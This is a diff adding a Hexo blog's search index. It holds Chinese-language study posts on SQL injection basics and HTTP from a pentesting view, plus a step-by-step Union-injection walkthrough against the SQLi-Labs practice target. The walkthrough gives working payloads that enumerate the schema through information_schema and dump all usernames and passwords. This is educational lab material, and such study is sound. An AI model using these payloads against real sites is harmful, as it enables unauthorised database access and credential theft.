@@ -1,0 +1,125 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2026/05/19/hello-world/"/>
+      <url>/2026/05/19/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL 注入入门 —— 原理、分类与注入点判断</title>
+      <link href="/2026/05/17/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/"/>
+      <url>/2026/05/17/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="什么是-SQL-注入"><a href="#什么是-SQL-注入" class="headerlink" title="什么是 SQL 注入"></a>什么是 SQL 注入</h2><p>SQL 注入就是<strong>把恶意的 SQL 命令插入到网站的输入框</strong>（账号&#x2F;密码&#x2F;搜索等），让服务器执行这些恶意命令，从而获取甚至篡改数据库里的敏感数据。</p><h2 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h2><h3 id="1-按查询字段类型分"><a href="#1-按查询字段类型分" class="headerlink" title="1. 按查询字段类型分"></a>1. 按查询字段类型分</h3><table><thead><tr><th align="left">类型</th><th align="left">定义</th><th align="left">特点</th></tr></thead><tbody><tr><td align="left"><strong>字符型注入</strong></td><td align="left">输入的参数是<strong>字符串</strong>（带引号）</td><td align="left">必须用引号闭合，如 <code>&#39; or 1=1#</code></td></tr><tr><td align="left"><strong>数字型注入</strong></td><td align="left">输入的参数是<strong>整数</strong>（无引号）</td><td align="left">直接拼接 SQL，如 <code>id=1 and 1=1</code></td></tr></tbody></table><h3 id="2-按注入方法分（核心-4-种）"><a href="#2-按注入方法分（核心-4-种）" class="headerlink" title="2. 按注入方法分（核心 4 种）"></a>2. 按注入方法分（核心 4 种）</h3><table><thead><tr><th align="left">方法</th><th align="left">核心逻辑</th><th align="left">特点</th></tr></thead><tbody><tr><td align="left"><strong>Union 注入</strong></td><td align="left">利用 <code>UNION</code> 合并多条查询结果</td><td align="left">能直接把数据查出来，最常用</td></tr><tr><td align="left"><strong>报错注入</strong></td><td align="left">故意让 SQL 报错，把数据显示在错误信息里</td><td align="left">不用回显位，靠报错拿数据</td></tr><tr><td align="left"><strong>布尔注入</strong></td><td align="left">靠页面是否显示成功&#x2F;失败来猜数据</td><td align="left">页面只回显”成功&#x2F;失败”，慢慢猜</td></tr><tr><td align="left"><strong>时间注入</strong></td><td align="left">靠页面响应时间来推断数据</td><td align="left">无回显时用，靠 <code>sleep(5)</code> 等函数</td></tr></tbody></table><hr><h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><h3 id="什么是注入点"><a href="#什么是注入点" class="headerlink" title="什么是注入点"></a>什么是注入点</h3><p>用户输入<strong>能直接拼接到后台 SQL 语句并被数据库执行的入口</strong>。本质上就是<strong>人机交互的地方</strong>。</p><h3 id="常见注入点位置"><a href="#常见注入点位置" class="headerlink" title="常见注入点位置"></a>常见注入点位置</h3><table><thead><tr><th>位置</th><th>示例</th></tr></thead><tbody><tr><td>GET 请求参数</td><td>URL 中 <code>?id=1</code>、<code>?name=test</code></td></tr><tr><td>POST 请求参数</td><td>登录框、搜索框、表单提交</td></tr><tr><td>HTTP 请求头</td><td>Cookie、User-Agent、Referer</td></tr></tbody></table><h3 id="判断注入点的方法"><a href="#判断注入点的方法" class="headerlink" title="判断注入点的方法"></a>判断注入点的方法</h3><ul><li><strong>数字型</strong>：<code>id=1 AND 1=1</code> 正常，<code>id=1 AND 1=2</code> 异常</li><li><strong>字符型</strong>：输入 <code>&#39;</code> 页面报错 → 存在字符型注入</li></ul><hr><h2 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式"></a>闭合方式</h2><table><thead><tr><th>类型</th><th>原始拼接方式</th><th align="center">是否需要闭合符</th><th>注入输入示例</th></tr></thead><tbody><tr><td>字符型</td><td><code>id=&#39;$id&#39;</code></td><td align="center">✅</td><td><code>1&#39; and 1=1--+</code></td></tr><tr><td>数字型</td><td><code>id=$id</code></td><td align="center">❌</td><td><code>1 and 1=2</code></td></tr></tbody></table><h3 id="常见闭合符号"><a href="#常见闭合符号" class="headerlink" title="常见闭合符号"></a>常见闭合符号</h3><p><code>&#39;</code> <code>&quot;</code> <code>&#39;)</code> <code>&#39;&#39;)</code> 等</p><h3 id="判断闭合三步骤"><a href="#判断闭合三步骤" class="headerlink" title="判断闭合三步骤"></a>判断闭合三步骤</h3><p><strong>第一步：测试单引号 <code>&#39;</code></strong></p><ul><li>提交 <code>?id=1&#39;</code></li><li>报错 → 单引号闭合 ✓</li><li>正常 → 继续下一步</li></ul><p><strong>第二步：测试双引号 <code>&quot;</code></strong></p><ul><li>提交 <code>?id=1&quot;</code></li><li>报错 → 双引号闭合 ✓</li><li>正常 → 大概率是数字型</li></ul><p><strong>第三步：验证数字型</strong></p><ul><li>提交 <code>?id=1 and 1=2</code></li><li>页面无数据&#x2F;异常 → 数字型</li><li>正常 → 考虑括号等特殊闭合</li></ul><h3 id="常用注释符"><a href="#常用注释符" class="headerlink" title="常用注释符"></a>常用注释符</h3><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td><code>--+</code></td><td>最常用，适配 URL 传参</td></tr><tr><td><code>#</code></td><td>MySQL 原生注释</td></tr><tr><td><code>%23</code></td><td><code>#</code> 的 URL 编码形式</td></tr></tbody></table><hr><h2 id="防护核心"><a href="#防护核心" class="headerlink" title="防护核心"></a>防护核心</h2><ol><li>对所有用户输入做<strong>严格过滤</strong></li><li>使用<strong>预编译语句</strong>（Prepared Statement）</li><li>避免<strong>直接拼接 SQL</strong></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL注入 </tag>
+            
+            <tag> Union注入 </tag>
+            
+            <tag> 报错注入 </tag>
+            
+            <tag> 布尔注入 </tag>
+            
+            <tag> 闭合方式 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HTTP 协议详解 —— 从渗透测试视角理解</title>
+      <link href="/2026/05/17/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"/>
+      <url>/2026/05/17/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</url>
+      
+        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>HTTP（HyperText Transfer Protocol）是应用层协议，默认端口 <strong>80</strong>，明文传输。特点是<strong>无状态、无连接、明文不安全</strong>。</p><p>理解 HTTP 是学 Web 安全的第一步 —— 抓包、改包、重放、接口调试、挖漏洞全靠它。</p><h2 id="HTTP-整体流程"><a href="#HTTP-整体流程" class="headerlink" title="HTTP 整体流程"></a>HTTP 整体流程</h2><ol><li>建立 <strong>TCP 三次握手</strong>（传输层连接）</li><li>直接在 TCP 连接上<strong>传输 HTTP 明文内容</strong>（无加密、无 TLS 握手）</li><li>按 HTTP 标准格式完成请求&#x2F;响应</li><li>通信完成后，发起 <strong>TCP 四次挥手</strong>断开连接</li></ol><hr><h2 id="请求结构"><a href="#请求结构" class="headerlink" title="请求结构"></a>请求结构</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.example.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 ...</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>SESSIONID=abc123</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">username</span>=admin&amp;password=<span class="number">123456</span></span></span><br></pre></td></tr></table></figure><h3 id="1-请求行"><a href="#1-请求行" class="headerlink" title="1. 请求行"></a>1. 请求行</h3><ul><li><strong>请求方法</strong>：<code>GET</code> &#x2F; <code>POST</code> &#x2F; <code>PUT</code> &#x2F; <code>DELETE</code></li><li><strong>请求 URL</strong>：<code>/user/login</code></li><li><strong>HTTP 版本</strong>：<code>HTTP/1.1</code>、<code>HTTP/2</code></li></ul><h3 id="2-请求头"><a href="#2-请求头" class="headerlink" title="2. 请求头"></a>2. 请求头</h3><table><thead><tr><th>头部</th><th>作用</th></tr></thead><tbody><tr><td><code>Host</code></td><td>目标主机</td></tr><tr><td><code>User-Agent</code></td><td>客户端标识（浏览器类型）</td></tr><tr><td><code>Cookie</code></td><td>用户身份&#x2F;登录状态</td></tr><tr><td><code>Referer</code></td><td>从哪个页面跳过来</td></tr><tr><td><code>Content-Type</code></td><td>请求体的数据类型</td></tr></tbody></table><h3 id="3-空行（必须有）"><a href="#3-空行（必须有）" class="headerlink" title="3. 空行（必须有）"></a>3. 空行（必须有）</h3><h3 id="4-请求体"><a href="#4-请求体" class="headerlink" title="4. 请求体"></a>4. 请求体</h3><p>传给服务器的数据：登录账号密码、表单内容、上传的文件、JSON 数据等。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>记忆规则</strong>：</p><ul><li><code>GET</code> → <strong>没有请求体</strong></li><li><code>POST</code> &#x2F; <code>PUT</code> &#x2F; <code>PATCH</code> → 一般有请求体</li></ul><hr><h2 id="常用请求方法"><a href="#常用请求方法" class="headerlink" title="常用请求方法"></a>常用请求方法</h2><table><thead><tr><th>方法</th><th>用途</th><th>特点</th></tr></thead><tbody><tr><td><code>GET</code></td><td>获取资源</td><td>参数在 URL 中，可缓存</td></tr><tr><td><code>POST</code></td><td>提交数据</td><td>参数在请求体，相对安全</td></tr><tr><td><code>PUT</code></td><td>完整覆盖修改</td><td>幂等</td></tr><tr><td><code>PATCH</code></td><td>局部修改</td><td>只改某个字段</td></tr><tr><td><code>DELETE</code></td><td>删除资源</td><td>幂等</td></tr><tr><td><code>HEAD</code></td><td>只拿响应头</td><td>探活、省流量</td></tr><tr><td><code>OPTIONS</code></td><td>问支持哪些方法</td><td>跨域预检</td></tr></tbody></table><hr><h2 id="响应结构"><a href="#响应结构" class="headerlink" title="响应结构"></a>响应结构</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.18.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session=abc123</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span>...<span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a>常见状态码</h3><p><strong>2xx 成功</strong></p><ul><li><code>200 OK</code> — 请求成功</li></ul><p><strong>3xx 重定向</strong></p><ul><li><code>301</code> — 永久重定向（换域名）</li><li><code>302</code> — 临时重定向</li><li><code>304</code> — 资源没变，用本地缓存</li></ul><p><strong>4xx 客户端错误</strong></p><ul><li><code>400</code> — 请求参数错误</li><li><code>401</code> — 未登录&#x2F;没 token</li><li><code>403</code> — 禁止访问（登录了但没权限）</li><li><code>404</code> — 资源不存在</li><li><code>405</code> — 方法错误（该用 POST 却发了 GET）</li></ul><p><strong>5xx 服务端错误</strong></p><ul><li><code>500</code> — 服务器内部错误（代码报错&#x2F;数据库崩了）</li><li><code>502</code> — 网关错误（超时&#x2F;负载&#x2F;挂了）</li><li><code>503</code> — 服务器维护中</li></ul><h3 id="连状态码都没拿到的情况"><a href="#连状态码都没拿到的情况" class="headerlink" title="连状态码都没拿到的情况"></a>连状态码都没拿到的情况</h3><ul><li>无法连接 &#x2F; DNS 解析失败 &#x2F; 超时</li><li>这是网络层面就断了，HTTP 请求根本没到达服务器</li></ul><hr><h2 id="为什么-HTTP-不够安全"><a href="#为什么-HTTP-不够安全" class="headerlink" title="为什么 HTTP 不够安全"></a>为什么 HTTP 不够安全</h2><ul><li><strong>明文传输</strong>：易被窃听、篡改、劫持</li><li><strong>无加密</strong>：中间人可以随意修改</li><li><strong>无身份校验</strong>：无法确认通信对方是否伪冒</li></ul><p>现在 Web 已逐步迁移到 <strong>HTTPS（443 端口）</strong>。</p><hr><h2 id="渗透测试要点"><a href="#渗透测试要点" class="headerlink" title="渗透测试要点"></a>渗透测试要点</h2><ol><li>用 <strong>Burp Suite</strong> 抓包，分析请求&#x2F;响应结构</li><li>重点关注 Cookie、Authorization、Referer 等头部</li><li>修改参数值测试是否存在注入、越权、XSS</li><li>观察状态码变化判断后端行为</li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络协议 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> HTTP </tag>
+            
+            <tag> BurpSuite </tag>
+            
+            <tag> 抓包 </tag>
+            
+            <tag> 状态码 </tag>
+            
+            <tag> GET </tag>
+            
+            <tag> POST </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Union 联合注入实战 —— SQLi-Labs 通关步骤</title>
+      <link href="/2026/05/17/Web%E5%AE%89%E5%85%A8/Union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98/"/>
+      <url>/2026/05/17/Web%E5%AE%89%E5%85%A8/Union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98/</url>
+      
+        <content type="html"><![CDATA[<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>拿到靶机中数据库的所有用户名和密码。</p><blockquote><p>⚠️ 所有注入参数中请使用<strong>英文字符</strong>！</p></blockquote><hr><h2 id="完整步骤"><a href="#完整步骤" class="headerlink" title="完整步骤"></a>完整步骤</h2><h3 id="步骤-1：找注入点-判断注入类型"><a href="#步骤-1：找注入点-判断注入类型" class="headerlink" title="步骤 1：找注入点 &amp; 判断注入类型"></a>步骤 1：找注入点 &amp; 判断注入类型</h3><ul><li>输入 <code>?id=1</code>：页面正常</li><li>输入 <code>?id=1&#39;</code>：页面报错 → <strong>字符型注入，单引号闭合</strong></li><li>输入 <code>?id=1&#39; and 1=1 --+</code>：正常</li><li>输入 <code>?id=1&#39; and 1=2 --+</code>：异常 → 确认注入</li></ul><h3 id="步骤-2：判断查询列数（order-by）"><a href="#步骤-2：判断查询列数（order-by）" class="headerlink" title="步骤 2：判断查询列数（order by）"></a>步骤 2：判断查询列数（<code>order by</code>）</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">1</span> <span class="comment">--+  → 正常</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">2</span> <span class="comment">--+  → 正常</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--+  → 正常</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27; order <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+  → 报错</span></span><br></pre></td></tr></table></figure><p><strong>结论</strong>：原查询有 <strong>3 列</strong>。</p><blockquote><p><code>order by N</code> 按第 N 列排序，报错说明列数不足。</p></blockquote><h3 id="步骤-3：找回显位置（union-select-1-2-3）"><a href="#步骤-3：找回显位置（union-select-1-2-3）" class="headerlink" title="步骤 3：找回显位置（union select 1,2,3）"></a>步骤 3：找回显位置（<code>union select 1,2,3</code>）</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>页面显示 <code>2</code> 和 <code>3</code> → 这两个位置可以回显数据。</p><blockquote><p><code>id=-1</code> 让原查询失效，页面只显示 <code>union</code> 后的结果。</p></blockquote><h3 id="步骤-4：获取当前数据库名（database-）"><a href="#步骤-4：获取当前数据库名（database-）" class="headerlink" title="步骤 4：获取当前数据库名（database()）"></a>步骤 4：获取当前数据库名（<code>database()</code>）</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span>&#x27; union <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>结果：<code>security</code></p><h3 id="步骤-5：获取所有表名（information-schema-tables）"><a href="#步骤-5：获取所有表名（information-schema-tables）" class="headerlink" title="步骤 5：获取所有表名（information_schema.tables）"></a>步骤 5：获取所有表名（<code>information_schema.tables</code>）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3</span></span><br><span class="line"><span class="string">from information_schema.tables</span></span><br><span class="line"><span class="string">where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>结果：<code>emails,referers,uagents,users</code></p><blockquote><p><code>information_schema.tables</code> 是 MySQL 的”表名集合表”。<code>group_concat()</code> 把多个结果拼成一行。</p></blockquote><h3 id="步骤-6：获取-users-表所有列名（information-schema-columns）"><a href="#步骤-6：获取-users-表所有列名（information-schema-columns）" class="headerlink" title="步骤 6：获取 users 表所有列名（information_schema.columns）"></a>步骤 6：获取 <code>users</code> 表所有列名（<code>information_schema.columns</code>）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3</span></span><br><span class="line"><span class="string">from information_schema.columns</span></span><br><span class="line"><span class="string">where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>结果：<code>id,username,password</code></p><h3 id="步骤-7：最终目标-——-拿到所有账号密码"><a href="#步骤-7：最终目标-——-拿到所有账号密码" class="headerlink" title="步骤 7：最终目标 —— 拿到所有账号密码"></a>步骤 7：最终目标 —— 拿到所有账号密码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username,&#x27;</span>:<span class="string">&#x27;,password separator &#x27;</span> <span class="operator">|</span> <span class="string">&#x27;),3</span></span><br><span class="line"><span class="string">from users --+</span></span><br></pre></td></tr></table></figure><p>结果：<code>admin:admin123 | test:test123 | ...</code></p><hr><h2 id="关键知识点"><a href="#关键知识点" class="headerlink" title="关键知识点"></a>关键知识点</h2><h3 id="information-schema-数据库"><a href="#information-schema-数据库" class="headerlink" title="information_schema 数据库"></a><code>information_schema</code> 数据库</h3><p>MySQL 自带的”数据字典”，存着所有数据库、表、列的信息。</p><table><thead><tr><th>表</th><th>关键字段</th><th>作用</th></tr></thead><tbody><tr><td><code>information_schema.tables</code></td><td><code>table_schema</code>, <code>table_name</code></td><td>查所有表名</td></tr><tr><td><code>information_schema.columns</code></td><td><code>table_schema</code>, <code>table_name</code>, <code>column_name</code></td><td>查所有列名</td></tr></tbody></table><h3 id="group-concat-的作用"><a href="#group-concat-的作用" class="headerlink" title="group_concat() 的作用"></a><code>group_concat()</code> 的作用</h3><p>把多行查询结果拼接到一行显示，避免一次只能看一条数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(username, <span class="string">&#x27;:&#x27;</span>, password separator <span class="string">&#x27; | &#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="查数据思路"><a href="#查数据思路" class="headerlink" title="查数据思路"></a>查数据思路</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查库名 → 查表名 → 查列名 → 拿数据</span><br></pre></td></tr></table></figure><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 找注入点     →  and 1=1 / 1=2</span><br><span class="line"><span class="bullet">2.</span> 判断类型     →  字符型 or 数字型</span><br><span class="line"><span class="bullet">3.</span> 找闭合方式   →  &#x27;  &quot;  &#x27;)</span><br><span class="line"><span class="bullet">4.</span> 判断列数     →  order by</span><br><span class="line"><span class="bullet">5.</span> 找回显位置   →  union select 1,2,3</span><br><span class="line"><span class="bullet">6.</span> 查库名       →  database()</span><br><span class="line"><span class="bullet">7.</span> 查表名       →  information<span class="emphasis">_schema.tables</span></span><br><span class="line"><span class="emphasis">8. 查列名       →  information_</span>schema.columns</span><br><span class="line"><span class="bullet">9.</span> 拿数据       →  group<span class="emphasis">_concat()</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Union注入 </tag>
+            
+            <tag> SQLi-Labs </tag>
+            
+            <tag> information_schema </tag>
+            
+            <tag> group_concat </tag>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
